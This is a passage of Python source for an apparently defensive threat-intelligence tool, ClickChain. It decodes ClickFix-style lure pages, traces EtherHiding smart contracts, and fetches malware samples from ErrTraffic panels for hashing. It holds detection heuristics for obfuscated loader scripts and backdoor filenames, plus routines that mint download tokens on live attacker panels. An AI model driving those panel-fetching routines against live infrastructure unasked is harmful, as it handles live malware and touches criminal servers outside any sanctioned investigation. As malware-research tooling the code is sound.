   --payload          DOES contact the attacker panel. DEFAULT metadata-only: hashes
                      (sha256/sha1/md5) + magic + size + HTTP headers kept, bytes
                      DISCARDED (nothing malicious on disk). Cached per-panel.
   --payload-files    additionally writes bytes with .bin suffix (NEVER .exe/.dmg/.apk)
   All output URLs    are defanged

═══════════════════════════════════════════════════════════════════════════════
 EXAMPLES
═══════════════════════════════════════════════════════════════════════════════
   # single defanged domain, full investigation
   clickchain.py "compraway[.]com" --comprehensive --resolve

   # comprehensive with on-panel payload pull (FLARE-VM recommended)
   clickchain.py compraway.com --comprehensive --payload --out-csv ioc.csv

   # comprehensive + dump every artifact for offline analysis / debugging
   clickchain.py compraway.com --comprehensive --payload --dump debug_dump/

   # use a manually-captured token from a victim browser session (best-effort
   # when the v3 init endpoint rejects the script for UA/cookie reasons)
   clickchain.py compraway.com --comprehensive --payload \
              --payload-token 8caaf953d89478b8a7191eb32295c117a310b53ac9059d4ad69a1e397ec3b2d4 \
              --payload-src compraway.com

   # point directly at a panel (auto-detected); skips lure decode
   clickchain.py lenders.digital --comprehensive --payload

   # STAGE 1: wide light sweep of 5,475 domains -> JSON + JSONL + CSV
   clickchain.py targets.txt --workers 24 --resolve --quiet \
              --out-json sweep.json --out-jsonl sweep.jsonl --out-csv sweep.csv

   # STAGE 1 variant: also pull payload METADATA (hash/headers, bytes discarded)
   clickchain.py targets.txt --workers 24 --resolve --payload \
              --quiet --out-json sweep.json --out-csv sweep.csv

   # STAGE 2a: investigate EVERY contract found in the sweep (the ledger deep-dive)
   POLYGONSCAN_API_KEY=... clickchain.py --from-batch sweep.json --chain polygon \
              --max-history 500 --out-json contracts.json --out-csv contracts.csv

   # STAGE 2b: comprehensive (heavy) over a curated shortlist of confirmed hits
   clickchain.py confirmed_hits.txt --comprehensive --payload --resolve \
              --out-json deep.json --out-csv deep.csv

   # bulk-investigate a hand-built address list
   clickchain.py --investigate-contracts addrs.txt --out-csv contracts.csv

   # rebuild full ErrTraffic C2 rotation history for one contract
   POLYGONSCAN_API_KEY=... clickchain.py \
       --investigate-contract 0x08207B087F61d7e95E441E15fd6d40BEfd6eD308 \
       --max-history 100 --out-json contract.json --out-csv rotations.csv

   # TRIAGE: read admin/owner/getURL/url on 81 candidate contracts (~10s total).
   # Answers "are these all separate customers or one operator's many instances?"
   clickchain.py --triage-contracts contracts_to_investigate.txt \
       --workers 16 --out-json triage.json --out-csv triage.csv

   # combined: harvest contracts from a prior sweep + triage them all
   clickchain.py --triage-contracts addrs.txt --from-batch sweep.json \
       --out-csv triage.csv

   # keep the actual binaries (FLARE-VM), not just metadata
   clickchain.py lenders.digital --comprehensive --payload --payload-files

   # decode a saved HTML page from FLARE-VM
   clickchain.py /flare/saved/page.html
""")
    ap.add_argument("input", nargs="?", help="URL/domain/file/dir/-, or omitted if --investigate-contract")
    ap.add_argument("--out", default=None,
                    help="dir for recovered .js (default: <input>_clickchain; '' to skip)")
    ap.add_argument("--format", choices=("text", "json", "jsonl"), default="text",
                    help="stdout format (default: text)")
    ap.add_argument("--out-json", metavar="FILE",
                    help="also write a JSON array of every report to FILE")
    ap.add_argument("--out-jsonl", metavar="FILE",
                    help="also write JSONL (one record per line) to FILE")
    ap.add_argument("--out-csv", metavar="FILE",
                    help="also write a flat CSV (one row per (input, group)) to FILE")
    ap.add_argument("--quiet", action="store_true",
                    help="text mode: hide per-block detail; in batch mode: hide all stdout text")
    ap.add_argument("--max-depth", type=int, default=8)
    ap.add_argument("--workers", type=int, default=DEFAULT_WORKERS,
                    help=f"concurrent workers in batch mode (default: {DEFAULT_WORKERS})")
    ap.add_argument("--fetch-timeout", type=int, default=DEFAULT_FETCH_TIMEOUT,
                    help=f"per-URL fetch timeout in seconds (default: {DEFAULT_FETCH_TIMEOUT})")
    ap.add_argument("--no-tls-verify", action="store_true",
                    help="disable TLS verification on URL fetches")
    ap.add_argument("--resolve", action="store_true",
                    help="for EtherHiding hits, also fire a passive eth_call against the RPC pool")
    ap.add_argument("--rpc-url", default=None, help="override RPC URL for --resolve / --investigate-contract")
    ap.add_argument("--rpc-timeout", type=int, default=DEFAULT_RPC_TIMEOUT)
    ap.add_argument("--investigate-contract", metavar="ADDR",
                    help="run contract-investigation mode on a single 0x... address")
    ap.add_argument("--investigate-contracts", metavar="FILE",
                    help="BULK contract mode: investigate every 0x... address in FILE "
                         "(one per line; comments/defang/blank lines tolerated). Writes a "
                         "per-contract JSON array + a contract-summary CSV + a long "
                         "rotations CSV (one row per setURL event across all contracts).")
    ap.add_argument("--triage-contracts", metavar="FILE",
                    help="TRIAGE mode: fast per-contract state read on every 0x... address "
                         "in FILE (one per line; comments/defang/blank lines tolerated). "
                         "Per contract = ONE batched JSON-RPC round-trip over five read-only "
                         "calls (eth_getCode + admin() + owner() + getURL() + url()). "
                         "Parallelized via --workers. NO history scan, NO writes. Pairs with "
                         "--from-batch to also harvest from a prior sweep. Emits a JSON "
                         "summary with 'distinct admin wallets across the set' + CSV one "
                         "row per contract. Use BEFORE --investigate-contracts to decide "
                         "which contracts deserve the full history scan.")
    ap.add_argument("--from-batch", metavar="BATCH_FILE",
                    help="BULK contract mode: harvest every distinct contract address out "
                         "of a prior stage-1 output file and investigate each. Accepts a "
                         "single JSON doc (--out-json) OR JSONL (--out-jsonl); handles "
                         "light-batch, comprehensive, and bulk-contract bundles. Pairs with "
                         "the wide sweep: sweep -> --from-batch sweep.jsonl. "
                         "Combine with --investigate-contracts.")
    ap.add_argument("--chain", default="polygon",
                    choices=("polygon", "bsc", "bsc-testnet", "ethereum"),
                    help="chain for --investigate-contract (default: polygon)")
    ap.add_argument("--max-history", type=int, default=200,
                    help="max tx history entries to collect in --investigate-contract")
    ap.add_argument("--max-block-scan", type=int, default=250_000,
                    help="max blocks to walk back in RPC fallback (default: 250k = ~6d on Polygon)")
    ap.add_argument("--skip-etherscan", action="store_true",
                    help="skip Etherscan-family fast path; force RPC block-scan")
    ap.add_argument("--comprehensive", action="store_true",
                    help="comprehensive single-IOC mode: fetch + decode + classify + resolve + "
                         "server-fingerprint + WordPress/CF detect + AES clipboard recovery + "
                         "(optionally) --payload all OS samples")
    ap.add_argument("--payload", action="store_true",
                    help="when an ErrTraffic panel URL is recovered (via --resolve or AES), "
                         "fetch one payload per OS via four strategies (known-token /a=dl, "
                         "v3 admin mint, v2 admin mint, v3 runtime /a=init mint). Saves bytes "
                         "SAFELY (.bin suffix, never executed) and computes SHA-256 for VT lookup.")
    ap.add_argument("--payload-token", metavar="HEX",
                    help="manually supply a known ErrTraffic download token (e.g. captured "
                         "from a FlareVM walk-through). When set, --payload skips the mint "
                         "chain and hits /api/index.php?a=dl directly. Pair with --payload-src.")
    ap.add_argument("--payload-src", metavar="LURE_HOST",
                    help="manually supply the &src= value to use with --payload-token (typically "
                         "the lure domain the AES blob was delivered to). Defaults to the panel host.")
    ap.add_argument("--payload-mode", metavar="MODE", default="cloudflare",
                    help="&mode= value to use with --payload-token (default: cloudflare).")
    ap.add_argument("--payload-files", action="store_true",
                    help="persist payload bytes to disk (<host>.<os>.<sha>.bin + "
                         ".clipboard.ps1 + .decoded.ps1). DEFAULT is metadata-only: "
                         "ClickChain hashes the payload (sha256/sha1/md5), records file "
                         "magic + size + full HTTP response headers, then DISCARDS the "
                         "bytes. Use this only when you actually want the binary on disk.")
    ap.add_argument("--detect-rotation", type=int, metavar="N", default=0,
                    help="DETECTION mode: re-fetch the panel init endpoint N times per OS "
                         "and compare AES PS / decrypted PS / binary hashes across runs. "
                         "Surfaces whether the kit serves polymorphic responses per request "
                         "(refutes/confirms Censys 'one-time token' framing for this kit "
                         "version). Burns N requests per OS against the live panel — use "
                         "sparingly. Recommended: 3.")
    ap.add_argument("--dump", metavar="DIR", default=None,
                    help="DEBUG mode: dump every raw artifact (lure HTML, init JSON, AES PS, "
                         "decrypted PS, recovered binary, role-probe response, contract calls) "
                         "into DIR for offline analysis or to send back for debugging. "
                         "Each file is named so analysts (and future-me) can grep + diff quickly.")
    ap.add_argument("--no-color", action="store_true",
                    help="disable ANSI colors in stdout (auto-disabled when not a TTY)")
    args = ap.parse_args()
    if args.no_color: C.disable()
    try: sys.stdout.reconfigure(encoding="utf-8")
    except Exception: pass

    # ---- flag-coherence guards (so nothing silently no-ops between modes) ----
    # --payload-files implies --payload (can't persist a payload you never fetched)
    if getattr(args, "payload_files", False) and not args.payload:
        args.payload = True
        print(f"{C.GRAY}[*] --payload-files implies --payload (enabling payload fetch){C.RESET}",
              file=sys.stderr)

    # ---- TRIAGE contract mode (--triage-contracts FILE, optionally + --from-batch) ----
    # Fast read-only probe — runs FIRST, on its own, so it never collides with
    # the heavy --investigate-contracts pipeline (which also accepts --from-batch).
    if args.triage_contracts:
        addresses, seen = [], set()
        def _stage_t(addr):
            a = (addr or "").lower()
            if re.fullmatch(r'0x[0-9a-f]{40}', a) and a not in seen:
                seen.add(a); addresses.append(a)
        for a in read_address_list(args.triage_contracts): _stage_t(a)
        # Allow combining with --from-batch (harvest contracts from a prior sweep)
        if args.from_batch:
            for a in harvest_contracts_from_batch(args.from_batch): _stage_t(a)
        if args.investigate_contract:  # let a single addr also be triaged
            _stage_t(args.investigate_contract)
        if not addresses:
            ap.error("no valid 0x… addresses found for --triage-contracts "
                     "(checked --triage-contracts / --from-batch / --investigate-contract)")
        print(f"{C.CYAN}[*] MODE: triage-contracts (fast read-only) | input: "
              f"{len(addresses)} address(es) | chain: {args.chain} | "
              f"workers: {args.workers} | output: JSON summary + per-contract CSV"
              f"{C.RESET}", file=sys.stderr)
        bundle = run_triage_contracts(addresses, args)
        if args.format == "json": render_json(bundle, jsonl=False)
        elif args.format == "jsonl": render_json(bundle, jsonl=True)
        else: _render_triage_text(bundle)
        if args.out_json:
            with open(args.out_json, "w", encoding="utf-8") as f:
                json.dump(bundle, f, ensure_ascii=False, indent=2)
        if args.out_csv:
            write_triage_csv(bundle, args.out_csv)
            print(f"{C.CYAN}[*] wrote triage CSV -> {args.out_csv}{C.RESET}",
                  file=sys.stderr)
        return

    # ---- BULK contract mode (--investigate-contracts FILE and/or --from-batch JSON) ----
    if args.investigate_contracts or args.from_batch:
        addresses, seen = [], set()
        def _stage(addr):
            a = (addr or "").lower()
            if re.fullmatch(r'0x[0-9a-f]{40}', a) and a not in seen:
                seen.add(a); addresses.append(a)
        if args.investigate_contracts:
            for a in read_address_list(args.investigate_contracts): _stage(a)
        if args.from_batch:
            for a in harvest_contracts_from_batch(args.from_batch): _stage(a)
        if args.investigate_contract: _stage(args.investigate_contract)  # allow mixing one in
        if not addresses:
            ap.error("no valid 0x… addresses found for bulk contract mode "
                     "(checked --investigate-contracts / --from-batch / --investigate-contract)")
        print(f"{C.CYAN}[*] MODE: bulk contract investigation | input: {len(addresses)} "
              f"distinct address(es) | chain: {args.chain} | output: per-contract JSON + "
              f"summary CSV + rotations CSV{C.RESET}", file=sys.stderr)
        bundle = run_bulk_contracts(addresses, args)
        if args.format == "json": render_json(bundle, jsonl=False)
        elif args.format == "jsonl": render_json(bundle, jsonl=True)
        else: _render_bulk_contracts_text(bundle)
        if args.out_json:
            with open(args.out_json, "w", encoding="utf-8") as f:
                json.dump(bundle, f, ensure_ascii=False, indent=2)
        if args.out_csv:
            rot = write_bulk_contract_csvs(bundle, args.out_csv)
            print(f"{C.CYAN}[*] wrote contract summary -> {args.out_csv}  +  rotations -> {rot}"
                  f"{C.RESET}", file=sys.stderr)
        return

    # ---- investigate-contract mode (single) ----
    if args.investigate_contract:
        print(f"{C.CYAN}[*] MODE: single contract investigation | address: "
              f"{args.investigate_contract} | chain: {args.chain}{C.RESET}", file=sys.stderr)
        report = investigate_contract(
            args.investigate_contract, chain=args.chain, max_history=args.max_history,
            max_blocks_to_scan=args.max_block_scan, workers=args.workers,
            rpc_override=args.rpc_url, timeout=args.rpc_timeout,
            skip_etherscan=args.skip_etherscan, progress_fh=sys.stderr)
        if args.format == "json": render_json(report, jsonl=False)
        elif args.format == "jsonl": render_json(report, jsonl=True)
        else: _render_contract_investigation_text(report)
        if args.out_json:
            with open(args.out_json, "w", encoding="utf-8") as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
        if args.out_csv:
            with open(args.out_csv, "w", encoding="utf-8", newline="") as f:
                cols = ["block_number","block_time","tx_hash","from","from_attribution",
                        "selector","function","decoded_param","decoded_param_defanged"]
                w = csv.DictWriter(f, fieldnames=cols); w.writeheader()
                for h in report.get("history", []): w.writerow({k: h.get(k,"") for k in cols})
        return

    if not args.input:
        ap.error("input is required (or use --investigate-contract)")

    # ---- comprehensive mode (single IOC, or batch over a target-list file) ----
    if args.comprehensive:
        if not args.input or args.input == "-":
            ap.error("--comprehensive requires a URL/domain input or a target-list file")
        # If the input is a target-list file, run the HEAVY pipeline over each line.
        if detect_input_kind(args.input) == "target_list":
            targets = read_target_list(args.input)
            print(f"{C.YELLOW}[*] MODE: COMPREHENSIVE BATCH | input: {len(targets)} targets "
                  f"from {args.input} | heavy per-domain pipeline (DNS/ports/TLS + WordPress + "
                  f"Cloudflare + backdoor probe + AES{' + payload' if args.payload else ''}) — "
                  f"contacts more infra than the light sweep{C.RESET}", file=sys.stderr)
            if args.payload and not args.resolve:
                print(f"{C.YELLOW}[!] --payload relies on the on-chain resolve to locate panels; "
                      f"comprehensive always resolves, so this is fine.{C.RESET}", file=sys.stderr)
            if args.out is None or args.out == "":
                args.out = "clickchain_comprehensive_batch"
            jf = jlf = cf = None
            sinks: dict = {}
            if args.out_json:  jf  = open(args.out_json,  "w", encoding="utf-8"); sinks["json"]  = jf
            if args.out_jsonl: jlf = open(args.out_jsonl, "w", encoding="utf-8"); sinks["jsonl"] = jlf
            if args.out_csv:
                cf = open(args.out_csv, "w", encoding="utf-8", newline="")
                sinks["csv"] = csv.DictWriter(cf, fieldnames=COMPREHENSIVE_CSV_COLUMNS)
                sinks["csv"].writeheader()
            try:
                stats = run_comprehensive_batch(targets, args, sinks)
            finally:
                for fh in (jf, jlf, cf):
                    if fh:
                        try: fh.close()
                        except Exception: pass
            print(f"\n[comprehensive batch complete] {stats['ok']} ok, "
                  f"{stats['fetch_error']} errors | roles={stats['by_role']} | "
                  f"actors={stats['by_actor']}", file=sys.stderr)
            return
        if args.out is None or args.out == "":
            args.out = "clickchain_comprehensive_" + _safe_filename(args.input)
        # OPSEC notice
        print(f"{C.YELLOW}[*] MODE: comprehensive single-IOC | input: {args.input} | "
              f"passive GET + on-chain resolve + server fingerprint + WordPress/CF detect"
              f"{' + payload' if args.payload else ''}{C.RESET}", file=sys.stderr)
        if args.payload:
            cap = "files (saved to disk)" if getattr(args, "payload_files", False) else "metadata-only (bytes discarded)"
            print(f"{C.YELLOW}[*] --payload enabled: hits the panel's mint+download endpoints "
                  f"per OS (NEVER executes). Capture mode: {cap}.{C.RESET}", file=sys.stderr)
        report = investigate_ioc_comprehensive(args.input, args, progress_fh=sys.stderr)
        if args.format == "json":  render_json(report, jsonl=False)
        elif args.format == "jsonl": render_json(report, jsonl=True)
        else: _render_comprehensive_text(report)
        if args.out_json:
            with open(args.out_json, "w", encoding="utf-8") as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
        if args.out_csv:
            # Comprehensive CSV — one flat row per IOC with EVERY enrichment
            # (lure fingerprint, WordPress, Cloudflare lure+panel, EtherHiding
            # contract, AES recovery, panel payloads).  Loader-group detail
            # also written to a sidecar `<csv>.loaders.csv` so the per-group
            # info from the base lure_page isn't lost.
            with open(args.out_csv, "w", encoding="utf-8", newline="") as f:
                w = csv.DictWriter(f, fieldnames=COMPREHENSIVE_CSV_COLUMNS)
                w.writeheader()
                w.writerow(comprehensive_to_csv_row(report))
            sidecar = args.out_csv + ".loaders.csv"
            base = report.get("lure_page", {})
            if base.get("groups"):
                with open(sidecar, "w", encoding="utf-8", newline="") as f:
                    w2 = csv.DictWriter(f, fieldnames=CSV_COLUMNS); w2.writeheader()
                    for row in report_to_csv_rows(base): w2.writerow(row)
            # Per-script sidecar — one row per (lure, external <script src>).
            # Restores the per-script visibility that was dropped from the text
            # output when WP-core paths got count-collapsed.
            scripts_rows = list(comprehensive_to_scripts_csv_rows(report))
            if scripts_rows:
                scripts_csv_path = args.out_csv + ".scripts.csv"
                with open(scripts_csv_path, "w", encoding="utf-8", newline="") as f:
                    w3 = csv.DictWriter(f, fieldnames=SCRIPTS_CSV_COLUMNS); w3.writeheader()
                    for row in scripts_rows: w3.writerow(row)
        # --dump: write every raw artifact to a directory for offline analysis
        if getattr(args, "dump", None):
            try:
                written = _dump_artifacts(report, args.dump)
                print(f"{C.CYAN}[*] --dump wrote {len(written)} artifact(s) to "
                      f"{args.dump}/{C.RESET}", file=sys.stderr)
            except Exception as e:
                print(f"{C.RED}[!] --dump failed: {e}{C.RESET}", file=sys.stderr)
        return

    # ---- normal modes (single or batch) ----
    if args.out is None:
        if args.input == "-":
            args.out = "clickchain_out"
        elif args.input.startswith(("http://", "https://")) or _looks_like_target(args.input) and not os.path.exists(args.input):
            safe = re.sub(r'[^A-Za-z0-9._-]', '_', args.input)[:60]
            args.out = f"clickchain_out_{safe}"
        else:
            args.out = os.path.splitext(args.input)[0] + "_clickchain"
    elif args.out == "":
        args.out = None

    kind = detect_input_kind(args.input)
    is_batch = kind == "target_list" or (kind == "directory")
    # Per-mode banner so the user always knows what ClickChain expects + will do.
    _mode_name = {"url": "single passive fetch", "domain": "single passive fetch",
                  "target_list": "light batch sweep", "directory": "directory decode",
                  "clickgrab_json": "single static decode", "html_file": "single static decode",
                  "stdin": "single static decode"}.get(kind, kind)
    _pay = ""
    if args.payload:
        cap = "files" if getattr(args, "payload_files", False) else "metadata-only"
        _pay = f" + payload({cap})"
    print(f"{C.CYAN}[*] MODE: {_mode_name} | input: {args.input} | "
          f"resolve={'on' if args.resolve else 'off'}{_pay} | "
          f"output: {'text' if not (args.out_json or args.out_csv or args.out_jsonl) else 'text + files'}"
          f"{C.RESET}", file=sys.stderr)
    if args.payload and not args.resolve:
        print(f"{C.YELLOW}[!] --payload in batch needs --resolve to locate panels on-chain; "
              f"without it, no payloads will be fetched. Add --resolve.{C.RESET}", file=sys.stderr)
    if args.payload and is_batch:
        print(f"{C.GRAY}[*] payloads are cached per-panel — thousands of lures pointing at one "
              f"panel touch it once.{C.RESET}", file=sys.stderr)

    # set up output sinks
    sinks: dict = {"text_quiet": args.quiet and is_batch}
    if args.out_json:  sinks["json"]  = open(args.out_json,  "w", encoding="utf-8")
    if args.out_jsonl: sinks["jsonl"] = open(args.out_jsonl, "w", encoding="utf-8")
    csv_file = None
    if args.out_csv:
        csv_file = open(args.out_csv, "w", encoding="utf-8", newline="")
        sinks["csv"] = csv.DictWriter(csv_file, fieldnames=CSV_COLUMNS)
        sinks["csv"].writeheader()

    try:
        if kind == "target_list":
            targets = read_target_list(args.input)
            stats = run_batch(targets, args, args.out, sinks)
            print(file=sys.stderr)
            print(f"[batch complete] {stats['ok']} ok, {stats['fetch_error']} fetch errors",
                  file=sys.stderr)
            print(f"[verdict breakdown] " +
                  ", ".join(f"{k}={v}" for k,v in sorted(stats['by_verdict'].items(),
                                                          key=lambda x:-x[1])),
                  file=sys.stderr)
            if stats["by_actor"]:
                print(f"[actors attributed] " +
                      ", ".join(f"{k}={v}" for k,v in sorted(stats['by_actor'].items(),
                                                              key=lambda x:-x[1])),
                      file=sys.stderr)
        elif kind == "directory":
            # directory of saved files — sequential is fine, no fetches needed
            json_buf = []
            for source_type, label, html, src_meta in iter_inputs(args.input, args.fetch_timeout,
                                                                    not args.no_tls_verify):
                src_meta = dict(src_meta or {}); src_meta.setdefault("source_type", source_type)
                report = analyze_html(label, html, src_meta,
                                      max_depth=args.max_depth, outdir=args.out,
                                      resolve_chain=args.resolve,
                                      rpc_override=args.rpc_url,
                                      rpc_timeout=args.rpc_timeout)
                if sinks.get("jsonl") is not None: render_json(report, sinks["jsonl"], jsonl=True)
                if sinks.get("json")  is not None: json_buf.append(report)
                if sinks.get("csv")   is not None:
                    for row in report_to_csv_rows(report): sinks["csv"].writerow(row)
                if not sinks.get("text_quiet", False): render_text(report, quiet=args.quiet)
            if sinks.get("json") is not None:
                json.dump(json_buf, sinks["json"], ensure_ascii=False, indent=2)
                sinks["json"].write("\n")
        else:
            # single input (URL, domain, html, json, stdin)
            json_buf = []
            for source_type, label, html, src_meta in iter_inputs(args.input, args.fetch_timeout,
                                                                    not args.no_tls_verify):
                src_meta = dict(src_meta or {}); src_meta.setdefault("source_type", source_type)
                if source_type == "fetch_error":
                    # Mode 2 fetch failed — build a clean fetch_error report
                    # instead of running analyze_html on empty HTML.
                    desc = src_meta.get("fetch_error_desc") or {}
                    report = _error_report(label, desc.get("err", "fetch failed"),
                                           status=desc.get("status"),
                                           category=desc.get("category"),
                                           hint=desc.get("hint"),
                                           panel_probe=desc.get("panel_probe"))
                else:
                    report = analyze_html(label, html, src_meta,
                                          max_depth=args.max_depth, outdir=args.out,
                                          resolve_chain=args.resolve,
                                          rpc_override=args.rpc_url,
                                          rpc_timeout=args.rpc_timeout)
                if args.format == "json":      render_json(report, jsonl=False)
                elif args.format == "jsonl":   render_json(report, jsonl=True)
                else:                          render_text(report, quiet=args.quiet)
                if sinks.get("jsonl") is not None: render_json(report, sinks["jsonl"], jsonl=True)
                if sinks.get("json")  is not None: json_buf.append(report)
                if sinks.get("csv")   is not None:
                    for row in report_to_csv_rows(report): sinks["csv"].writerow(row)
            if sinks.get("json") is not None:
                json.dump(json_buf, sinks["json"], ensure_ascii=False, indent=2)
                sinks["json"].write("\n")
    finally:
        for k in ("json", "jsonl"):
            if sinks.get(k) is not None: sinks[k].close()
        if csv_file is not None: csv_file.close()


def _dump_artifacts(report: dict, dump_dir: str, *, fetched_html: str | None = None) -> list[str]:
    """Write every raw artifact in the report to `dump_dir` for offline analysis.

    Files written (those that have content):
      00_report.json                — entire report dict (pretty-printed)
      01_lure_html.txt              — raw HTML the script fetched (--dump only)
      02_role_probe.txt             — body of the init-probe used for role classify
      03_panel_landing.txt          — body of the GET to the panel root (if panel-mode)
      10_loader_block_<i>.html      — each obfuscated <script> body as found
      11_decoded_<group_hash>.js    — each decode-chain output
      20_init_<os>_response.json    — raw init JSON per OS
      21_init_<os>_aes_ps.ps1       — the AES PowerShell as served (clipboard string)
      22_init_<os>_decrypted.ps1    — AES-decrypted plaintext
      30_payload_<os>_<sha>.bin     — the actual recovered binary (already on disk
                                       under args.out, just symlinked / copied here)
      99_strategy_diagnostics.txt   — every HTTP attempt + status + body excerpt
    Returns the list of file paths written for stdout summary."""
    os.makedirs(dump_dir, exist_ok=True)
    written = []

    def w(name: str, data, *, binary: bool = False):
        path = os.path.join(dump_dir, name)
        mode = "wb" if binary else "w"
        kwargs = {} if binary else {"encoding": "utf-8"}
        with open(path, mode, **kwargs) as fh:
            fh.write(data)
        written.append(path)
        return path

    # 00 — full report (pretty)
    w("00_report.json", json.dumps(report, indent=2, default=str, ensure_ascii=False))

    # 01 — raw lure HTML if caller fed it (passed in via fetched_html)
    if fetched_html:
        w("01_lure_html.html", fetched_html)

    # 02 — role probe
    role = report.get("input_role") or {}
    if role.get("probe"):
        w("02_role_probe.txt",
          f"URL: {role['probe'].get('url')}\n"
          f"STATUS: {role['probe'].get('status')}\n"
          f"CT: {role['probe'].get('content_type')}\n"
          f"ERROR: {role['probe'].get('error')}\n\n"
          f"BODY[:300]:\n{role['probe'].get('body_excerpt') or ''}\n")

    # 03 — panel landing response (panel mode only)
    if report.get("panel_landing_response"):
        plr = report["panel_landing_response"]
        w("03_panel_landing.txt",
          json.dumps(plr, indent=2, default=str, ensure_ascii=False))

    # 10/11 — per-loader-block content (from base lure_page)
    base = report.get("lure_page") or {}
    for i, g in enumerate(base.get("groups") or []):
        gh = g.get("group_hash", f"g{i:02d}")
        # recovered JS path is already on disk — write a copy here for portability
        rjp = g.get("recovered_js_path")
        if rjp and os.path.isfile(rjp):
            try:
                w(f"11_decoded_{gh[:12]}.js", open(rjp, encoding="utf-8", errors="replace").read())
            except Exception: pass

    # 20/21/22 — per-OS init artifacts (panel-direct or via comprehensive --payload)
    pp = (report.get("panel_payloads") or {}).get("per_os") or {}
    for os_t, r in pp.items():
        if r.get("init_response_aes_ps"):
            w(f"21_init_{os_t}_aes_ps.ps1", r["init_response_aes_ps"])
        ird = r.get("init_response_aes_decrypt") or {}
        if ird.get("plaintext"):
            w(f"22_init_{os_t}_decrypted.ps1", ird["plaintext"])
        # 30 — payload bytes already saved to disk by _finalize_payload_save;
        # we just symlink / record where they are
        if r.get("saved_path") and os.path.isfile(r["saved_path"]):
            try:
                with open(r["saved_path"], "rb") as src:
                    w(f"30_payload_{os_t}_{(r.get('sha256') or '')[:12]}.bin", src.read(), binary=True)
            except Exception: pass

    # 99 — strategy diagnostics across all OSes
    diag_lines = []
    for os_t, r in pp.items():
        diag_lines.append(f"=== {os_t} ===")
        diag_lines.append(f"  token_source: {r.get('token_source')}")
        diag_lines.append(f"  version_used: {r.get('version_used')}  endpoint_family: {r.get('endpoint_family')}")
        diag_lines.append(f"  result: bytes={r.get('payload_bytes')} sha256={r.get('sha256')} magic={r.get('magic')}")
        for a in r.get("token_attempts") or []:
            diag_lines.append(f"  [{a.get('phase')}/{a.get('family')}]  HTTP {a.get('status')}  {a.get('url')}")
            if a.get("error"):
                diag_lines.append(f"      err: {a['error']}")
            if a.get("body_excerpt"):
                be = (a['body_excerpt'] or "")[:200].replace('\n', ' ')
                diag_lines.append(f"      body[:200]: {be!r}")
        diag_lines.append("")
    if diag_lines:
        w("99_strategy_diagnostics.txt", "\n".join(diag_lines))
    return written


def _categorize_scripts(srcs: list[str]) -> dict:
    """Bucket every external <script src> into one of:
      - suspicious  : self-hosted paths that look anomalous (non-WP, mu-plugins
                      with unusual filenames, etc.). Generic WP-core paths
                      (including wp-includes/js/dist/script-modules/, which IS
                      a legitimate WP 6.4+ Interactivity-API directory) are
                      classified as wp_core — to flag those as suspicious we'd
                      need to fetch and compare against a known-legit WP build.
      - non_wp_core : anything self-hosted that isn't under wp-includes/wp-content/mu-plugins
      - wp_core     : wp-includes, wp-content/themes, wp-content/plugins, wp-content/mu-plugins
      - analytics   : googletagmanager, GA, FB, recaptcha, stripe, etc.

    Returns dict[bucket] = list[(src, optional_note)].
    Every input URL ends up in exactly one bucket — nothing is dropped or collapsed.

    PATH-LEVEL HEURISTICS ONLY. Cannot tell if a wp_core path has been tampered
    without fetching the body and comparing against legit WP source — see
    fetch_and_classify_script_body() for that follow-up step."""
    out = {"suspicious": [], "non_wp_core": [], "wp_core": [], "analytics": []}
    ANALYTICS = ("googletagmanager", "google-analytics", "googleadservices",
                 "google.com/recaptcha", "google[.]com/recaptcha",
                 "connect.facebook", "connect[.]facebook", "facebook.net",
                 "stripe.com", "stripe[.]com", "accounts.google", "accounts[.]google",
                 "gstatic.com", "googlesyndication", "doubleclick", "hotjar",
                 "segment.com", "segment.io", "cloudflareinsights", "amplitude")
    WP_CORE   = ("/wp-includes/", "/wp-content/themes/", "/wp-content/plugins/",
                 "/wp-content/mu-plugins/", "/wp-content/uploads/")
    # mu-plugins paths with names that DON'T look like normal mu-plugin files
    # (typical legit mu-plugin filenames: object-cache.php, advanced-cache.php,
    # wp-rocket-mu-plugin.php, etc.). Anything in mu-plugins with a generic
    # name like session-manager.php / auto-loader.php is more interesting —
    # but still not authoritatively malicious from PATH alone.
    SUSPICIOUS_MU_NAMES = ("session-manager", "auto-loader", "loader.php",
                            "wp-load.php", "init.php", "stub.php")
    for src in srcs:
        lsrc = src.lower()
        # 1) Analytics / 3rd-party trust-by-default services
        if any(x in lsrc for x in ANALYTICS):
            out["analytics"].append((src, None))
            continue
        # 2) mu-plugins with suspicious-looking filenames go to suspicious
        if "/wp-content/mu-plugins/" in lsrc and any(n in lsrc for n in SUSPICIOUS_MU_NAMES):
            out["suspicious"].append((src, "mu-plugins file with name pattern "
                                           "associated with WP backdoors — verify body"))
            continue
        # 3) Generic WordPress paths (including wp-includes/js/dist/script-modules/,
        #    which is the legitimate WP 6.4+ Interactivity API). Path alone is
        #    not enough to flag as suspicious — body-level inspection required.
        if any(x in lsrc for x in WP_CORE):
            out["wp_core"].append((src, None))
            continue
        # 4) Everything else self-hosted — non-WP-core, deserves a look
        out["non_wp_core"].append((src, "non-WP-core path — manually verify body"))
    return out


def classify_script_body(body: str) -> dict:
    """Inspect a fetched <script> body and decide if it looks legitimate
    (real WP / framework code) or obfuscated/malicious (atob+XOR loops,
    char-array assembly, eval-of-decoded-string).

    Returns: {"verdict": "legitimate" | "obfuscated" | "ambiguous",
              "confidence": float, "signals": [str...]}.

    Used to validate that flagged scripts actually contain something malicious
    (vs the false-positive case where a legit WP core file lives at a path
    name pattern that LOOKED suspicious from URL alone)."""
    if not body: return {"verdict": "ambiguous", "confidence": 0.0,
                          "signals": ["empty_body"]}
    sigs = []
    score_mal = 0.0
    score_leg = 0.0
    bl = body.lower()
    # ── Malicious indicators ───────────────────────────────────────────────
    if "atob(" in bl:
        n = bl.count("atob(")
        sigs.append(f"atob_calls:{n}")
        # 1 atob is normal (jQuery uses it); 3+ in one block = suspicious
        if n >= 3: score_mal += 0.5
    if "fromcharcode" in bl:
        sigs.append("string_fromcharcode")
        score_mal += 0.2
    if re.search(r"\beval\s*\(", body):
        sigs.append("eval_call"); score_mal += 0.3
    if re.search(r"new\s+Function\s*\(", body):
        sigs.append("new_function"); score_mal += 0.3
    # XOR with single-byte literal in a hot loop — kit signature
    if re.search(r"\bk\s*=\s*\d{1,3}\s*[,;]\s*d\s*=", body):
        sigs.append("xor_key_kit_pattern"); score_mal += 0.5
    # var _<hex> tokens (kit obfuscation often emits these)
    if len(re.findall(r"var\s+_[a-f0-9]{4,6}\b", body)) >= 2:
